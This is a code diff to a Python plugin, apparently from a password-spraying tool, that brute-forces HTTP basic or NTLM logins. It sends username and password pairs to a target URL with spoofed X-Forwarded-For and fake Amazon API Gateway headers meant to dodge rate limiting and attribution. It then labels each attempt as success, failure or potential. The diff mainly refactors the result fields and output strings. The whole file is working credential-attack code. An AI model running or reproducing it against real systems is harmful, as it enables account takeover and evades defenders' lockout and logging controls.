@@ -1,29 +1,15 @@
-import datetime, requests, requests_ntlm
+import requests, requests_ntlm
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
-def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CHANGEME: replace template with plugin name
-
-    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
+def httpbrute_authenticate(url, username, password, useragent, pluginargs):
 
     data_response = {
-        'timestamp': ts,
-        'username': username,
-        'password': password,
-        'success': False,
-        'change': False,
-        '2fa_enabled': False,
-        'type': None,
-        'code': None,
-        'name': None,
-        'action': None,
-        'headers': [],
-        'cookies': [],
-        'sourceip' : None,
-        'throttled' : False,
+        'result' : None,    # Can be "success", "failure" or "potential"
         'error' : False,
-        'output' : ""
+        'output' : "",
+        'valid_user' : False
     }
 
     spoofed_ip = utils.generate_ip()
@@ -32,7 +18,7 @@ def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CH
 
     # CHANGEME: Add more if necessary
     headers = {
-        'User-Agent': useragent,
+        'User-Agent' : useragent,
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
@@ -44,7 +30,7 @@ def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CH
 
         resp = None
 
-        full_url = "{}/{}".format(url,pluginargs['uri'])
+        full_url = f"{url}/{pluginargs['uri']}"
 
         if pluginargs['auth'] == 'basic':
             auth = requests.auth.HTTPBasicAuth(username, password)
@@ -60,16 +46,17 @@ def httpbrute_authenticate(url, username, password, useragent, pluginargs): # CH
 
 
         if resp.status_code == 200:
-            data_response['success'] = True
-            data_response['output'] = 'SUCCESS: => {}:{}'.format(username, password)
+            data_response['result'] = "success"
+            data_response['output'] = f"[+] SUCCESS: => {username}:{password}"
+            data_response['valid_user'] = True
 
         elif resp.status_code == 401:
-            data_response['success'] = False
-            data_response['output'] = 'FAILURE: => {}:{}'.format(username, password)
+            data_response['result'] = "failure"
+            data_response['output'] = f"[-] FAILURE: => {username}:{password}"
 
         else: #fail
-            data_response['success'] = False
-            data_response['output'] = 'UNKNOWN_RESPONSE_CODE: {} => {}:{}'.format(resp.status_code, username, password)
+            data_response['result'] = "potential"
+            data_response['output'] = f"[?] UNKNOWN_RESPONSE_CODE: {resp.status_code} => {username}:{password}"
 
 
     except Exception as ex:
